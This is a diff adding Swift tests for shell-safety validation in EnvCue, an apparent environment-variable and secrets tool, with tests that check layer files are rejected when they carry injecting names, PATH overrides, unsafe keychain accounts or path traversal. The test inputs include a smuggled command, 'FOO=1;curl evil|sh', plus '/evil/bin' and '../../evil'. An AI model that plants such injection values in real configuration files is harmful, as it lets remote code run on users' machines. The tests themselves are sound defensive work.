@@ -266,3 +266,92 @@ import Testing
     #expect(EnvCueCoreError.unknownValue(context: "secret_backend", value: "vault").description
         == "envcue: unknown value 'vault' in secret_backend")
 }
+
+// MARK: - Field shell-safety (PROPOSAL-001 / G3): a name/account must never be able to
+// inject into the sourced snapshot. Enforced at the loadLayer boundary.
+
+@Test func loadLayerRejectsInjectingVariableName() {
+    // The classic weaponized layer file: the name itself is shell code. The variable
+    // sub-key is quoted so it genuinely lands under [vars] and hits name validation.
+    let toml = """
+    [vars."FOO=1;curl evil|sh"]
+    kind  = "plain"
+    value = "x"
+    """
+    #expect(throws: EnvCueCoreError.self) {
+        _ = try EnvCueCore.loadLayer(name: "work", toml: toml)
+    }
+}
+
+@Test func loadLayerRejectsSpacesAndLeadingDigitsInName() {
+    for badName in ["FOO BAR", "1FOO", "FOO-BAR", "FOO$X"] {
+        let toml = "[vars.\"\(badName)\"]\nkind = \"plain\"\nvalue = \"x\"\n"
+        #expect(throws: EnvCueCoreError.self) {
+            _ = try EnvCueCore.loadLayer(name: "work", toml: toml)
+        }
+    }
+}
+
+@Test func loadLayerRejectsPATHPerZeroPathPolicy() {
+    let toml = """
+    [vars.PATH]
+    kind  = "plain"
+    value = "/evil/bin"
+    """
+    #expect(throws: EnvCueCoreError.pathManagedExternally(layer: "base")) {
+        _ = try EnvCueCore.loadLayer(name: "base", toml: toml)
+    }
+}
+
+@Test func loadLayerRejectsAccountWithUnsafeCharacters() {
+    // A newline / quote in an account would break the snapshot's keychain-get line.
+    let toml = """
+    [vars.OPENAI_API_KEY]
+    kind    = "secret"
+    account = "personal/OPENAI'API"
+    """
+    #expect(throws: EnvCueCoreError.self) {
+        _ = try EnvCueCore.loadLayer(name: "personal", toml: toml)
+    }
+}
+
+@Test func loadLayerAcceptsLegalNamesAndAccounts() throws {
+    let toml = """
+    [vars.OPENAI_API_KEY]
+    kind    = "secret"
+    account = "personal/OPENAI_API_KEY"
+
+    [vars._EDITOR2]
+    kind  = "plain"
+    value = "nvim"
+    """
+    let layer = try EnvCueCore.loadLayer(name: "personal", toml: toml)
+    #expect(layer.entries.count == 2)
+}
+
+@Test func validateLayerNameRejectsTraversal() {
+    for bad in ["../../evil", "a/b", "a b", ""] {
+        #expect(throws: EnvCueCoreError.self) {
+            try EnvCueCore.validateLayerName(bad)
+        }
+    }
+    // Legal scene/layer names pass.
+    #expect(throws: Never.self) {
+        try EnvCueCore.validateLayerName("work-vpn")
+        try EnvCueCore.validateLayerName("base")
+    }
+}
+
+@Test func shellSafetyErrorsAreReadableAndValueFree() {
+    let probe = "sk-secret-DEADBEEF"
+    let errors: [EnvCueCoreError] = [
+        .illegalVarName(name: "FOO BAR", layer: "work"),
+        .illegalAccount(layer: "personal", variable: "OPENAI_API_KEY"),
+        .illegalLayerName(layer: "../x"),
+        .pathManagedExternally(layer: "base"),
+    ]
+    for e in errors {
+        #expect(e.description.hasPrefix("envcue: "))
+        #expect(!e.description.contains(probe))
+    }
+}
